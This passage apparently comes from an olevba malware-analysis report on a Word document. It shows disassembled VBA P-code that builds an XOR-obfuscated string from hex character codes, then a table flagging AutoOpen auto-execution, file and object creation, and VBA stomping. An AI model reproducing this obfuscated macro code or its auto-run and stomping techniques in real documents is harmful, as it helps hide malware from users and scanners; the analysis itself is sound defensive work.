' 	LitDI2 0x0012 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0008 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0096 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FE 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0023 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FE 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FD 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x007D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BE 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0095 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0017 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #138:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #139:
' 	EndSub 
' Line #140:
' Line #141:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

